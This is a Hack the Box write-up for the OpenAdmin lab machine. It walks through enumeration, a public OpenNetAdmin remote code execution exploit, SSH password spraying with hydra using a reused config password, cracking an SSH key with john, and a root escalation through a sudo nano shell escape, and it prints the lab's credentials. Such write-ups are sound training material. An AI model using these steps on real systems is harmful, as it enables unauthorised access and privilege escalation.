+++
title = "Hack the Box: OpenAdmin"
date = 2023-01-15
description = "Hack the Box: OpenAdmin"
tags = [
    "Hack the Box",
    "Write-up"
]
+++

# OpenAdmin

## Enumeration

### Nmap

```
# nmap -Pn --min-rate=10000 -sV -sC openadmin.htb -nvv -e tun0
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHqbD5jGewKxd8heN452cfS5LS/VdUroTScThdV8IiZdTxgSaXN1Qga4audhlYIGSyDdTEL8x2tPAFPpvipRrLE=
|   256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBcV0sVI0yWfjKsl7++B9FGfOVeWAIWZ4YGEMROPxxk4
80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Gobuster

```
# gobuster dir -u http://openadmin.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x php,js,txt,htm,html,jsp
# gobuster dir -u http://openadmin.htb/music -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x php,js,txt,htm,html,jsp

/ona/
```

### Searchploit

Search for exploit on ONA:

```
# searchsploit opennetadmin
# OpenNetAdmin 18.1.1 - Remote Code Execution
```

## Foothold

Use the exploit above and get a shell

```
# dos2unix /usr/share/exploitdb/exploits/php/webapps/47691.sh
# ./47691.sh http://10.10.10.171/ona/
$
```

Find a password in `./local/config/database_settings.inc.php`. Try to use it on every users `cat /etc/passwd | grep home`

```
# hydra -L ~/Downloads/usershtb.txt -p n1nj4W4rri0R! openadmin.htb -t 4 ssh
```

Match with jimmy account, connect to his account.

```
# scp /opt/privilege-escalation-awesome-scripts-suite/linPEAS/linpeas.sh jimmy@openadmin.htb:/home/jimmy
```

We get informations about the open port and processes running:

```
# netstat -tupln
# ps -aux
```

We can do a port redirect to access the admin dashboard:

```
# ssh -L 52846:127.0.0.1:52846 jimmy@10.10.10.171
```

We find a SHA512 hash:

```
# cat /var/www/internal/main.php
# cat /var/www/internal/index.php
# 00e302ccdcf1c60b8ad50ea50cf72b939705f49f40f0dc658801b4680b7d758e
ebdc2e9f9ba8ba3ef8a8bb9a796d34ba2e856838ee9bdde852b8ec3b3a0523b1
value : Revealed
```

It’s joanna password, we can get her ssh password protected ssh private key with:

```
# curl http://127.0.0.1:52846/main.php --output -
```

Crack it with john after saving it into a file:

```
# ssh2john .ssh/id_rsa_joanna > crackme
# sudo john crackme --wordlist=/usr/share/wordlists/rockyou.txt
value : bloodninjas
```

we can now connect to ssh using joanna account and get the user hash in **/home/joanna/user.txt**

## Privilege Escalation

Run `linpeas.sh` again with joanna. `sudo -l` is also a good idea. It reveals that we can launch the following command with sudo right : `sudo /bin/nano /opt/priv`. We can abuse that using [GTFOBins#nano](https://gtfobins.github.io/gtfobins/nano/#sudo "https://gtfobins.github.io/gtfobins/nano/#sudo") and do the following :

```
# sudo /bin/nano /opt/priv
CTRL+r
CTRL+x
cat /root/root.txt
```

or

```
# sudo /bin/nano /opt/priv
CTRL+r
CTRL+x
reset; sh 1>&0 2>&0
```